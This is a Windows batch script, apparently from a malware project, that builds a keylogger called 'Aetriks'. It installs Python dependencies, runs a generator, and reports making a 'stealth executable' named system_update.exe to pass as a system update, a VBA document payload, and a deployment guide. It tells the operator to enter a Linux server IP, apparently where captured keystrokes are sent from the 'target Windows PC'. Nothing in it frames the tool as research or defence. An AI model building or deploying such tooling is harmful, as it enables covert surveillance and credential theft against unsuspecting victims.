@echo off
echo ========================================
echo Aetriks Single-File Keylogger Builder
echo ========================================

REM Check if Python is installed
python --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Python is not installed or not in PATH
    pause
    exit /b 1
)

REM Check if pip is available
pip --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] pip is not available
    pause
    exit /b 1
)

echo [INFO] Installing dependencies...
pip install -r keylogger/requirements.txt

if errorlevel 1 (
    echo [ERROR] Failed to install dependencies
    pause
    exit /b 1
)

echo [INFO] Creating single-file stealth executable...
cd keylogger
python deploy_generator.py

if errorlevel 1 (
    echo [ERROR] Single-file executable creation failed
    pause
    exit /b 1
)

echo [SUCCESS] Single-file stealth executable created!
echo [INFO] Files created in keylogger/ directory:
echo   - dist/system_update.exe (single executable - no dependencies)
echo   - system_update.vba (document payload)
echo   - DEPLOYMENT_INSTRUCTIONS.txt (deployment guide)
echo.
echo [INFO] The executable is completely self-contained!
echo [INFO] No additional files needed on target Windows PC.
echo [INFO] Remember to update config.json with your Linux server IP
echo [INFO] Review DEPLOYMENT_INSTRUCTIONS.txt for deployment options
pause 